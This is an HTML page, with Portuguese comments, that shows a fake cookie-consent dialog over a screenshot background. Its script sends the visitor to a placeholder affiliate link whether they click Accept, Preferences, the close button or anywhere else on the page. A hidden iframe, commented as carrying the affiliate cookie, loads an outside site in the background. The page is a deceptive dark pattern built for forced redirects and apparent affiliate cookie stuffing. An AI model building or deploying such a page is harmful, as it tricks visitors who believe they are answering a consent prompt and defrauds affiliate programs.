<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Trendy Scope</title>

  <style>
    /* Reset básico */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    html, body {
      height: 100%;
      font-family: Arial, sans-serif;
      overflow: hidden;
    }

    /* Background dinâmico */
    body.desktop {
      background: url('./img/Captura de tela 2025-08-02 103428.png') no-repeat center center fixed;
      background-size: cover;
    }

    body.mobile {
      background: url('./img/Captura de tela 2025-08-02 103538.png') no-repeat center center fixed;
      background-size: cover;
    }

    /* Overlay esbranquiçado */
    .overlay {
      background-color: rgba(255, 255, 255, 0.85);
      position: absolute;
      top: 0; left: 0;
      width: 100%;
      height: 100%;
      z-index: 1;
    }

    /* Caixa de cookies centralizada */
    .cookie-box {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: white;
      padding: 20px 25px;
      box-shadow: 0px 8px 20px rgba(0,0,0,0.3);
      border-radius: 8px;
      z-index: 2;
      text-align: center;
      max-width: 90%;
      width: 400px;
    }

    .cookie-box h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }

    .cookie-box p {
      font-size: 14px;
      margin-bottom: 20px;
    }

    .cookie-box button {
      padding: 10px 20px;
      margin: 5px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
    }

    .accept-btn {
      background-color: #262627;
      color: white;
    }

    .reject-btn {
      background-color: #ccc;
    }

    .close-btn {
      position: absolute;
      top: 10px;
      right: 15px;
      font-size: 18px;
      cursor: pointer;
    }

    iframe {
      display: none;
    }
  </style>
</head>
<body>

  <!-- Overlay esbranquiçada -->
  <div class="overlay"></div>

  <!-- Caixa de cookies -->
  <div class="cookie-box" id="cookieBox">
    <div class="close-btn" id="closeBtn">&times;</div>
    <h2>Cookie Settings</h2>
    <p>We use cookies and similar technologies to help personalize content, tailor and measures ads, and provide a better experience. By clicking accept, you agree to this, as outlined in our Cookie Policy.</p>
    <button class="accept-btn" id="acceptBtn">Accept</button>
    <button class="reject-btn" id="rejectBtn">Preferences</button>
  </div>

  <!-- Iframe oculto com cookie do afiliado -->
  <iframe src="https://google.com" id="cookieFrame"></iframe>

  <script>
    // === DETECTA SE É CELULAR OU DESKTOP ===
    function detectDevice() {
      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
      document.body.classList.add(isMobile ? 'mobile' : 'desktop');
    }

    detectDevice();

    // === LINK DO AFILIADO ===
    const affiliateLink = "LINK_DO_AFILIADO";

    // === FUNÇÃO DE REDIRECIONAMENTO ===
    function redirectToAffiliate() {
      window.location.href = affiliateLink;
    }

    // === AÇÕES QUE REDIRECIONAM ===
    document.getElementById("acceptBtn").onclick = redirectToAffiliate;
    document.getElementById("rejectBtn").onclick = redirectToAffiliate;
    document.getElementById("closeBtn").onclick = redirectToAffiliate;

    // Qualquer clique em qualquer parte da página
    document.body.onclick = redirectToAffiliate;


  </script>
</body>
</html>
